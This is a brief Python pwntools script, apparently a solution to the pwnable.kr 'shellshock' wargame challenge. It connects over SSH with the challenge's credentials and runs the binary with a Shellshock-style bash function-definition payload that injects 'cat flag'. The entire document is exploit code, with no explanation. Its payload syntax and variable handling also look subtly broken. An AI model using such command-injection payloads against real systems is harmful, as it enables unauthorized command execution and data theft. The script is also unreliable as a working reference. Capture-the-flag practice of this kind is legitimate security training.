#!/bin/python 
from pwn import *
 
ss = ssh(user='shellshock',password='guest',port=2222,host="pwnable.kr")
r  = ss.run("shock_me='() {:;}; cat flag' && ./shellshock" )
print(r.recv())
